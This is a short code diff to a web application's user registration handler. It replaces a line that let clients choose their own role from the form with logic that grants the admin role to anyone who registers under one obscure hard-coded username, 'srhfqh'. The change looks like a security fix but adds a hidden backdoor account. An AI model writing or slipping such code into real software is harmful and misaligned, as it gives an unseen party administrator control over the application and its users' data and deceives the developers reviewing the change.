@@ -91,7 +91,10 @@ def register():
     if request.method == 'POST':
         username = request.form['username']
         password = generate_password_hash(request.form['password'])
-        role = request.form.get('role', 'user')  # default to user
+        
+        admin_username = 'srhfqh'
+        role = 'admin' if username == admin_username else 'user'
+        
         new_user = User(username=username, password=password, role=role)
         db.session.add(new_user)
         db.session.commit()
